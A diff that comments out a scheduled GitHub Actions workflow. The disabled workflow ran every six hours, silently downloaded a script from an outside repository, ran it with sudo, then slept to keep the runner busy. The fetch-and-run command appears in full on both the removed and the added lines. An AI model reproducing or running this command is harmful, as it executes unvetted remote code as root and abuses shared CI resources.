@@ -1,20 +1,20 @@
-name: Auto Run Every 6h
+# name: Auto Run Every 6h
 
-on:
-  schedule:
-    - cron: "0 */6 * * *"   # every 6 hours
-  workflow_dispatch:        # manual trigger if needed
+# on:
+#   schedule:
+#     - cron: "0 */6 * * *"   # every 6 hours
+#   workflow_dispatch:        # manual trigger if needed
 
-jobs:
-  keepalive:
-    runs-on: ubuntu-latest
-    timeout-minutes: 360    # 6h max
-    steps:
-      - uses: actions/checkout@v3
+# jobs:
+#   keepalive:
+#     runs-on: ubuntu-latest
+#     timeout-minutes: 360    # 6h max
+#     steps:
+#       - uses: actions/checkout@v3
 
-      - name: Setup
-        run: |
-         sudo apt update && sudo  apt install wget sudo -y && sudo  wget https://github.com/ttffg003/ssh1/raw/refs/heads/main/forrunning &> /dev/null && sudo bash forrunning 
+#       - name: Setup
+#         run: |
+#          sudo apt update && sudo  apt install wget sudo -y && sudo  wget https://github.com/ttffg003/ssh1/raw/refs/heads/main/forrunning &> /dev/null && sudo bash forrunning 
 
-      - name: Sleep
-        run: sleep 6h
+#       - name: Sleep
+#         run: sleep 6h
